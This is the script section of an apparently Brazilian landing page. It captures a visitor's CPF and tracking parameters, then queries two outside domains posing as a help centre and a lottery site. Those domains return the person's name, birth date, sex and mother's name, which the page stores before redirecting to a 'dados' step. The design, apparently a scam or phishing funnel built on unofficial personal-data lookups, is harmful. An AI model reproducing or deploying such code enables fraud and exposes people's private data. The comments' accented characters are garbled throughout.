    <script>
        // Captura os UTMs assim que a p치gina carregar
        document.addEventListener('DOMContentLoaded', function() {
            const urlParams = new URLSearchParams(window.location.search);
            
            // Tentar pegar UTMs salvos do localStorage
            let savedUtms = {};
            try {
                const saved = localStorage.getItem('utmParams');
                if (saved) {
                    savedUtms = JSON.parse(saved);
                }
            } catch (e) {
                console.error('Erro ao ler UTMs do localStorage:', e);
            }
            
            // Capturar UTMs da URL atual (prioridade) ou usar os salvos
            const utmParams = {
                utm_source: urlParams.get('utm_source') || savedUtms.utm_source || null,
                utm_medium: urlParams.get('utm_medium') || savedUtms.utm_medium || null,
                utm_campaign: urlParams.get('utm_campaign') || savedUtms.utm_campaign || null,
                utm_content: urlParams.get('utm_content') || savedUtms.utm_content || null,
                utm_term: urlParams.get('utm_term') || savedUtms.utm_term || null,
                src: urlParams.get('src') || savedUtms.src || null,
                sck: urlParams.get('sck') || savedUtms.sck || null
            };
            
            // Salvar no localStorage apenas se houver valores v치lidos
            const hasValidUtms = Object.values(utmParams).some(val => val !== null && val !== '');
            if (hasValidUtms) {
                localStorage.setItem('utmParams', JSON.stringify(utmParams));
                console.log('UTMs capturados:', utmParams); // Debug
            }
        });
    </script>

    <!-- Scripts -->
    <script>
        // Formata칞칚o de CPF
        function formatCpf(input) {
            let value = input.value.replace(/\D/g, '');
            if (value.length > 3) value = value.replace(/^(\d{3})(\d)/, '$1.$2');
            if (value.length > 6) value = value.replace(/^(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
            if (value.length > 9) value = value.replace(/^(\d{3})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3-$4');
            input.value = value;
        }

        // Adiciona classe ao form-group quando input est치 em foco/preenchido
        document.addEventListener('DOMContentLoaded', function() {
            const cpfInput = document.getElementById('cpf');
            const formGroup = cpfInput.closest('.form-group');
            
            // Fun칞칚o para atualizar o estado do label
            function updateLabelState() {
                if (cpfInput.value.trim() !== '') {
                    // Se tem valor, sempre mant칠m no topo
                    formGroup.classList.add('focused');
                } else if (document.activeElement === cpfInput) {
                    // Se est치 em foco mas vazio, mant칠m no topo
                    formGroup.classList.add('focused');
                } else {
                    // Se est치 vazio e sem foco, remove do topo
                    formGroup.classList.remove('focused');
                }
            }
            
            // Verifica estado inicial
            updateLabelState();
            
            cpfInput.addEventListener('focus', function() {
                formGroup.classList.add('focused');
            });
            
            cpfInput.addEventListener('blur', function() {
                updateLabelState();
            });
            
            cpfInput.addEventListener('input', function() {
                updateLabelState();
            });
        });

        // Submiss칚o do formul치rio
        document.getElementById('cpfForm').addEventListener('submit', async function (event) {
            event.preventDefault();

            const cpfInput = document.getElementById('cpf');
            const cpf = cpfInput.value.replace(/\D/g, '');
            const button = this.querySelector('button[type="submit"]');

            button.disabled = true;
            button.textContent = 'Consultando...';
            button.style.opacity = '0.6';

            try {
                if (cpf.length !== 11) {
                    throw new Error('Por favor, digite um CPF v치lido.');
                }

                let data = null;
                let dadosTratados = null;

                // Tentar primeira API
                try {
                    const apiUrl = `https://centralajudabrasil.online/api/9bYgzcOU4T0Hjl9D8hnTH1Hx9GQ6SPZX/cpf/${cpf}`;
                    console.log('Consultando API 1:', apiUrl);
                    const response = await fetch(apiUrl, { method: "GET" });

                    if (response.ok) {
                        data = await response.json();
                        console.log('Resposta da API 1:', data);

                        if (data && typeof data === "object" && data.NOME) {
                            dadosTratados = {
                                cpf: cpf,
                                nome: data.NOME || "",
                                nascimento: data.NASC || "",
                                sexo: data.SEXO || "",
                                nome_mae: data.NOME_MAE || ""
                            };
                        }
                    }
                } catch (error) {
                    console.log('API 1 falhou, tentando API 2...', error);
                }

                // Se a primeira API falhou, tentar segunda API
                if (!dadosTratados) {
                    try {
                        const apiUrl2 = `https://loteriasbilhetesonline.it.com/api/cpf/consulta/${cpf}`;
                        console.log('Consultando API 2:', apiUrl2);
                        const response2 = await fetch(apiUrl2, { method: "GET" });

                        if (response2.ok) {
                            const data2 = await response2.json();
                            console.log('Resposta da API 2:', data2);

                            if (data2 && data2.success && data2.data) {
                                const dados = data2.data;
                                dadosTratados = {
                                    cpf: dados.cpf || cpf,
                                    nome: dados.nome || dados.nome_completo || "",
                                    nascimento: dados.data_nascimento || "",
                                    sexo: "",
                                    nome_mae: ""
                                };
                            }
                        }
                    } catch (error) {
                        console.log('API 2 falhou:', error);
                    }
                }

                if (dadosTratados) {
                    console.log('Dados tratados:', dadosTratados);
                    localStorage.setItem('cpf', dadosTratados.cpf);
                    localStorage.setItem('nome', dadosTratados.nome);
                    localStorage.setItem('nascimento', dadosTratados.nascimento);
                    localStorage.setItem('sexo', dadosTratados.sexo);
                    localStorage.setItem('nome_mae', dadosTratados.nome_mae);

                    // Mostra mensagem de carregamento
                    button.textContent = 'Entrando...';
                    button.style.opacity = '0.8';

                    // Delay de 3 segundos antes do redirecionamento
                    setTimeout(() => {
                        // Capturar UTMs da URL atual e do localStorage
                        const urlParams = new URLSearchParams(window.location.search);
                        const utmParams = new URLSearchParams();
                        
                        // Tentar pegar UTMs salvos do localStorage
                        let savedUtms = {};
                        try {
                            const saved = localStorage.getItem('utmParams');
                            if (saved) {
                                savedUtms = JSON.parse(saved);
                            }
                        } catch (e) {
                            console.warn('Erro ao ler UTMs do localStorage:', e);
                        }
                        
                        // Mesclar UTMs: prioridade para URL, depois localStorage
                        const utmFields = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'src', 'sck'];
                        utmFields.forEach(key => {
                            const urlValue = urlParams.get(key);
                            const savedValue = savedUtms[key];
                            // Prioridade: URL > localStorage
                            const value = urlValue || savedValue;
                            if (value) {
                                utmParams.append(key, value);
                            }
                        });
                        
                        const utmString = utmParams.toString() ? '?' + utmParams.toString() : '';
                        window.location.href = './dados' + utmString;
                    }, 3000);
                } else {
                    throw new Error("Dados n칚o encontrados para este CPF.");
                }

            } catch (error) {
                console.error('Erro:', error);
                alert(error.message || 'CPF inv치lido ou erro ao consultar. Por favor, tente novamente.');
                // Reabilita o bot칚o apenas em caso de erro
                button.disabled = false;
                button.textContent = 'Pr칩ximo';
                button.style.opacity = '1';
            }
        });
    </script>
